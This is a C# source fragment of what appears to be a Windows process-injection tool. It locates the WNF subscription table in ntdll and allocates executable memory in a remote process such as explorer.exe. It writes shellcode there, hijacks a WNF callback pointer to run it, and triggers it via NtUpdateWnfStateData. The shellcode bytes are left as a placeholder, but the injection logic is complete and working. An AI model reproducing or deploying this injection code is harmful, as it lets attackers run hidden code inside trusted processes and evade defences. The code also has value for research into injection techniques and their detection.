        [MarshalAs(UnmanagedType.Bool)] bool CheckChangeStamp);

    // Shellcode
    // ==> https://github.com/odzhan/injection/blob/master/payload/x64/payload.c
    //  -> cl -DWNF -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
    //  -> link /order:@wnf.txt /entry:WnfCallback /base:0 payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
    //  -> xbin payload.exe .text
    // Below was compiled for x64 only!
    //-----------------------------------
    public static byte[] NotepadSc = new byte[35693]
{
           <Place Shellcode here>
           
 };

    // Helpers
    //-----------------------------------
    public static PROC_VALIDATION ValidateProc(Int32 ProcId)
    {
        PROC_VALIDATION Pv = new PROC_VALIDATION();

        try
        {
            Process Proc = Process.GetProcessById(ProcId);
            Pv.isvalid = true;
            Pv.sName = Proc.ProcessName;
            Pv.hProc = GetProcessHandle(ProcId);
            IsWow64Process(Pv.hProc, ref Pv.isWow64);

        }
        catch
        {
            Pv.isvalid = false;
        }

        return Pv;
    }

    public static SYSTEM_INFORMATION GetSystemInformation()
    {
        SYSTEM_INFORMATION Si = new SYSTEM_INFORMATION();
        GetSystemInfo(ref Si);
        return Si;
    }

    public static IntPtr GetProcessHandle(Int32 ProcId)
    {
        IntPtr hProc = OpenProcess(0x1F0FFF, false, ProcId);
        SymInitialize(hProc, IntPtr.Zero, true);
        return hProc;
    }

    public static SECTABLE_INFO GetSectionTableFromPtr(IntPtr pDOS)
    {
        SECTABLE_INFO st = new SECTABLE_INFO();
        //  IntPtr pNt = IntPtr.Add(pDOS, Marshal.ReadInt32(IntPtr.Add(pDOS, 0x3c)));
        IntPtr pNt = new IntPtr(pDOS.ToInt64() + Marshal.ReadInt32(new IntPtr(pDOS.ToInt64() + 0x3c)));
        //st.sCount = Marshal.ReadInt16(IntPtr.Add(pNt, 0x6));
        st.sCount = Marshal.ReadInt16(new IntPtr(pNt.ToInt64() + 0x6));
        // Int16 OptHeadSize = Marshal.ReadInt16(IntPtr.Add(pNt, 0x14));
        Int16 OptHeadSize = Marshal.ReadInt16(new IntPtr(pNt.ToInt64() + 0x14));
        //st.pSecTable = IntPtr.Add(pNt, (0x18 + OptHeadSize));
        st.pSecTable = new IntPtr(pNt.ToInt64() + (0x18 + OptHeadSize));
        return st;
    }

    public static IntPtr GetRModuleBase(UInt32 ProcId)
    {
        IntPtr pNtBase = IntPtr.Zero;
        Process Proc = Process.GetProcessById((int)ProcId);
        foreach (ProcessModule Module in Proc.Modules)
        {
            if (Module.FileName.Contains("\\ntdll.dll"))
            {
                pNtBase = Module.BaseAddress;
            }
        }

        return pNtBase;
    }

    public static int FindExplorerPID()
    {
        IntPtr hWnd = FindWindow("Shell_TrayWnd", "");
        if (hWnd != IntPtr.Zero)
        {
            int ProcId = 0;
            GetWindowThreadProcessId(hWnd, ref ProcId);
            return ProcId;
        }
        else
        {
            return 0;
        }
    }

    public static String GetSymForPtr(IntPtr hProc, IntPtr pSymb)
    {
        // Yikes, what a damn mess..

        // (1) Get the module name
        System.Text.StringBuilder Module = new System.Text.StringBuilder();
        Module.EnsureCapacity(0x255);
        GetMappedFileNameW(hProc, pSymb, Module, 0x254);
        String ModuleName = (Module.ToString()).Split('\\').Last();

        // (2) Get the symbol name
        IMAGEHLP_SYMBOLW64 Sym = new IMAGEHLP_SYMBOLW64();
        Sym.SizeOfStruct = (UInt32)Marshal.SizeOf(Sym);
        Sym.MaxNameLength = 0x254;

        IntPtr pSym = Marshal.AllocHGlobal(Marshal.SizeOf(Sym));
        Marshal.StructureToPtr(Sym, pSym, true);

        Int64 Offset = 0;
        bool GetSym = SymGetSymFromAddr64(hProc, pSymb.ToInt64(), ref Offset, pSym);

        // Set the result
        String PointerSymbol = String.Empty;
        if (GetSym)
        {
            //SymbolName = "OK";
            Sym = (IMAGEHLP_SYMBOLW64)Marshal.PtrToStructure(pSym, typeof(IMAGEHLP_SYMBOLW64));
            String SymbolName = (new string(Sym.Name)).Replace("\0", string.Empty);
            PointerSymbol = ModuleName + "!" + SymbolName;
        }
        else
        {
            PointerSymbol = "N/A";
        }

        Marshal.FreeHGlobal(pSym);
        return PointerSymbol;
    }

    public static WNF_SUBTBL_LEAK LeakWNFSubtRVA()
    {
        // Forcibly create _WNF_SUBSCRIPTION_TABLE in our process
        LoadLibrary("efswrt.dll");
        IntPtr pNtdll = GetModuleHandle("ntdll.dll");

        // Get pSection & count
        SECTABLE_INFO SecTbl = GetSectionTableFromPtr(pNtdll);

        // Res Obj
        WNF_SUBTBL_LEAK wnftbl = new WNF_SUBTBL_LEAK();

        // Loop sections
        IMAGE_SECTION_HEADER sh = new IMAGE_SECTION_HEADER();
        for (int i = 0; i < SecTbl.sCount; i++)
        {
            //IntPtr pCurrSection = IntPtr.Add(SecTbl.pSecTable, (i * 0x28));
            IntPtr pCurrSection = new IntPtr(SecTbl.pSecTable.ToInt64() + (i * 0x28));
            sh = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(pCurrSection, typeof(IMAGE_SECTION_HEADER));

            // Is the section writable => DATA?
            if ((sh.Characteristics & SectionFlags.MEM_WRITE) == SectionFlags.MEM_WRITE)
            {
                //  IntPtr pSecOffset = IntPtr.Add(pNtdll, (int)sh.VirtualAddress);
                IntPtr pSecOffset = new IntPtr(pNtdll.ToInt64() + (int)sh.VirtualAddress);
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                for (int j = 0; j < sh.VirtualSize; j += IntPtr.Size)
                {
                    // IntPtr pProbeAddr = IntPtr.Add(pSecOffset, j);
                    IntPtr pProbeAddr = new IntPtr(pSecOffset.ToInt64() + j);
                    int CallRes = VirtualQuery(Marshal.ReadIntPtr(pProbeAddr), ref mbi, Marshal.SizeOf(mbi));
                    if (CallRes == Marshal.SizeOf(mbi))
                    {
                        if (mbi.State == 0x1000 && mbi.Type == 0x20000 && mbi.Protect == 0x4)
                        {
                            int NodeType = Marshal.ReadInt16(Marshal.ReadIntPtr(pProbeAddr));
                            // int NodeSize = Marshal.ReadInt16(IntPtr.Add(Marshal.ReadIntPtr(pProbeAddr), 2));
                            int NodeSize = Marshal.ReadInt16(new IntPtr(Marshal.ReadIntPtr(pProbeAddr).ToInt64() + 2));
                            if (NodeType == (int)WnfNodeTypeCode.WNF_NODE_SUBSCRIPTION_TABLE && NodeSize == Marshal.SizeOf(typeof(WNF_SUBSCRIPTION_TABLE)))
                            {
                                wnftbl.pNtdll = pProbeAddr;
                                wnftbl.iNtdllRVA = ((int)sh.VirtualAddress + j);
                                break;
                            }
                        }
                    }
                }
            }
        }
        return wnftbl;
    }

    public static REMOTE_WNF_SUBTBL VerifyRemoteSubTable(UInt32 ProcId, IntPtr hProc, int iNtdllRVA)
    {
        // Get ntdll base in repote proc
        REMOTE_WNF_SUBTBL rSubtbl = new REMOTE_WNF_SUBTBL();
        rSubtbl.pNtBase = GetRModuleBase(ProcId);
        if (rSubtbl.pNtBase == IntPtr.Zero)
        {
            return rSubtbl;
        }

        // Read the remote _WNF_SUBSCRIPTION_TABLE pointer
        IntPtr pRtbl = Marshal.AllocHGlobal(Marshal.SizeOf(IntPtr.Size));
        uint bRead = 0;
        //bool CallRes = ReadProcessMemory(hProc, IntPtr.Add(rSubtbl.pNtBase, iNtdllRVA), pRtbl, (uint)IntPtr.Size, ref bRead);
        bool CallRes = ReadProcessMemory(hProc, new IntPtr(rSubtbl.pNtBase.ToInt64() + iNtdllRVA), pRtbl, (uint)IntPtr.Size, ref bRead);

        if (!CallRes)
        {
            return rSubtbl;
        }
        rSubtbl.pRemoteTbl = Marshal.ReadIntPtr(pRtbl);

        // Verify that it is Ptr->_WNF_SUBSCRIPTION_TABLE
        WNF_SUBSCRIPTION_TABLE wst = new WNF_SUBSCRIPTION_TABLE();
        IntPtr pSubTbl = Marshal.AllocHGlobal(Marshal.SizeOf(wst));
        bRead = 0;
        CallRes = ReadProcessMemory(hProc, Marshal.ReadIntPtr(pRtbl), pSubTbl, (uint)Marshal.SizeOf(wst), ref bRead);
        if (!CallRes)
        {
            return rSubtbl;
        }
        wst = (WNF_SUBSCRIPTION_TABLE)Marshal.PtrToStructure(pSubTbl, typeof(WNF_SUBSCRIPTION_TABLE));
        if (wst.Header.NodeTypeCode == (int)WnfNodeTypeCode.WNF_NODE_SUBSCRIPTION_TABLE && wst.Header.NodeByteSize == Marshal.SizeOf(typeof(WNF_SUBSCRIPTION_TABLE)))
        {
            rSubtbl.bHasTable = true;
            rSubtbl.sSubTbl = wst;
        }
        else
        {
            rSubtbl.bHasTable = false;
        }

        return rSubtbl;
    }

    public static List<WNF_SUBSCRIPTION_SET> ReadWnfSubscriptions(IntPtr hProc, IntPtr Flink, IntPtr Blink)
    {
        List<WNF_SUBSCRIPTION_SET> WnfSubSet = new List<WNF_SUBSCRIPTION_SET>();
        while (true)
        {
            IntPtr pNameSub = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WNF_NAME_SUBSCRIPTION)));
            uint bRead = 0;
            // bool CallRes = ReadProcessMemory(hProc, IntPtr.Subtract(Flink, (int)Marshal.OffsetOf(typeof(WNF_NAME_SUBSCRIPTION), "NamesTableEntry")), pNameSub, (uint)Marshal.SizeOf(typeof(WNF_NAME_SUBSCRIPTION)), ref bRead);
            bool CallRes = ReadProcessMemory(hProc, new IntPtr(Flink.ToInt64() - (int)Marshal.OffsetOf(typeof(WNF_NAME_SUBSCRIPTION), "NamesTableEntry")), pNameSub, (uint)Marshal.SizeOf(typeof(WNF_NAME_SUBSCRIPTION)), ref bRead);
            if (!CallRes)
            {
                break;
            }

            // Process WNF_NAME_SUBSCRIPTION
            WNF_SUBSCRIPTION_SET wss = new WNF_SUBSCRIPTION_SET();
            WNF_NAME_SUBSCRIPTION wns = (WNF_NAME_SUBSCRIPTION)Marshal.PtrToStructure(pNameSub, typeof(WNF_NAME_SUBSCRIPTION));
            wss.SubscriptionId = wns.SubscriptionId;
            if (Enum.IsDefined(typeof(WnfStateNames), wns.StateName))
            {
                wss.StateName = ((WnfStateNames)wns.StateName).ToString();
            }
            else
            {
                wss.StateName = "0x" + String.Format("{0:X}", wns.StateName);
            }
            // We need to loop all WNF_USER_SUBSCRIPTION's for each WNF_NAME_SUBSCRIPTION
            IntPtr wusFlink = wns.SubscriptionsListHead.Flink;
            IntPtr wusBlink = wns.SubscriptionsListHead.Blink;
            List<WNF_USER_SET> WnfUserSet = new List<WNF_USER_SET>();
            while (true)
            {
                IntPtr pUserSub = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WNF_USER_SUBSCRIPTION)));
                bRead = 0;
                // CallRes = ReadProcessMemory(hProc, IntPtr.Subtract(wusFlink, (int)Marshal.OffsetOf(typeof(WNF_USER_SUBSCRIPTION), "SubscriptionsListEntry")), pUserSub, (uint)Marshal.SizeOf(typeof(WNF_USER_SUBSCRIPTION)), ref bRead);
                CallRes = ReadProcessMemory(hProc, new IntPtr(wusFlink.ToInt64() - (int)Marshal.OffsetOf(typeof(WNF_USER_SUBSCRIPTION), "SubscriptionsListEntry")), pUserSub, (uint)Marshal.SizeOf(typeof(WNF_USER_SUBSCRIPTION)), ref bRead);
                if (!CallRes)
                {
                    break;
                }

                // Process WNF_USER_SUBSCRIPTION
                WNF_USER_SUBSCRIPTION wus = (WNF_USER_SUBSCRIPTION)Marshal.PtrToStructure(pUserSub, typeof(WNF_USER_SUBSCRIPTION));
                WNF_USER_SET wu = new WNF_USER_SET();
                wu.UserSubscription = wusFlink;
                wu.CallBack = wus.Callback;
                wu.Context = wus.CallbackContext;
                WnfUserSet.Add(wu);

                // Should we exit?
                if (wusFlink == wusBlink)
                {
                    break;
                }
                else
                {
                    wusFlink = wus.SubscriptionsListEntry.Flink;
                }
            }
            wss.UserSubs = WnfUserSet;

            // Add struct to result set
            WnfSubSet.Add(wss);

            // Should we exit?
            if (Flink == Blink)
            {
                break;
            }
            else
            {
                Flink = wns.NamesTableEntry.Flink;
            }
        }

        return WnfSubSet;
    }

    public static SC_ALLOC RemoteScAlloc(IntPtr hProc)
    {
        SC_ALLOC ScStruct = new SC_ALLOC();
        IntPtr rScPointer = VirtualAllocEx(hProc, IntPtr.Zero, (uint)NotepadSc.Length, 0x3000, 0x40);
        if (rScPointer == IntPtr.Zero)
        {
            return ScStruct;
        }
        else
        {
            uint BytesWritten = 0;
            Boolean WriteResult = WriteProcessMemory(hProc, rScPointer, NotepadSc, (uint)NotepadSc.Length, ref BytesWritten);
            if (!WriteResult)
            {
                VirtualFreeEx(hProc, rScPointer, 0, 0x8000);
                return ScStruct;
            }
        }

        // Set alloc data
        ScStruct.Size = (uint)NotepadSc.Length;
        ScStruct.pRemote = rScPointer;

        return ScStruct;
    }

    public static void RewriteSubscriptionPointer(IntPtr hProc, WNF_SUBSCRIPTION_SET Subscription, IntPtr Shellcode, Boolean Restore)
    {
        // Get struct ptr
        WNF_USER_SET UserSubscriptionStruct = new WNF_USER_SET();
        foreach (WNF_USER_SET UserSub in Subscription.UserSubs)
        {
            // We only care about the first one if multiple
            UserSubscriptionStruct = UserSub;
            break;
        }

        // Rewrite callback
        if (Restore)
        {
            // Restore the original Ptr
            byte[] pRestore = BitConverter.GetBytes((UInt64)UserSubscriptionStruct.CallBack);
            uint BytesWritten = 0;
            //WriteProcessMemory(hProc, IntPtr.Add(UserSubscriptionStruct.UserSubscription, (int)Marshal.OffsetOf(typeof(WNF_USER_SUBSCRIPTION), "NameSubscription")), pRestore, (uint)pRestore.Length, ref BytesWritten);
            WriteProcessMemory(hProc, new IntPtr(UserSubscriptionStruct.UserSubscription.ToInt64() + (int)Marshal.OffsetOf(typeof(WNF_USER_SUBSCRIPTION), "NameSubscription")), pRestore, (uint)pRestore.Length, ref BytesWritten);
            // Free remote shellcode
            System.Threading.Thread.Sleep(200);
            VirtualFreeEx(hProc, Shellcode, 0, 0x8000);
        }
        else
        {
            // Overwrite callback with Sc ptr
            byte[] pSc = BitConverter.GetBytes((UInt64)Shellcode);
            uint BytesWritten = 0;
            //WriteProcessMemory(hProc, IntPtr.Add(UserSubscriptionStruct.UserSubscription, (int)Marshal.OffsetOf(typeof(WNF_USER_SUBSCRIPTION), "NameSubscription")), pSc, (uint)pSc.Length, ref BytesWritten);
            WriteProcessMemory(hProc, new IntPtr(UserSubscriptionStruct.UserSubscription.ToInt64() + (int)Marshal.OffsetOf(typeof(WNF_USER_SUBSCRIPTION), "NameSubscription")), pSc, (uint)pSc.Length, ref BytesWritten);
        }

    }

    public static void UpdateWnfState()
    {
        UInt64 State = (UInt64)WnfStateNames.WNF_SHEL_LOGON_COMPLETE; // 0xd83063ea3bc1875
        WnfTypeId gTypeId = new WnfTypeId();
        UInt32 CallRes = NtUpdateWnfStateData(ref State, IntPtr.Zero, 0, gTypeId, IntPtr.Zero, 0, false);
    }

}